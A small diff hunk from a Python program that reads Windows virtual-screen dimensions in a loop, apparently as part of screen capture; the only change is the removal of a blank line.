@@ -19,7 +19,6 @@ def main(host, key):
   PREV_IMG = None
   while True:
     hdesktop = win32gui.GetDesktopWindow()
-
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
     height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
     left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
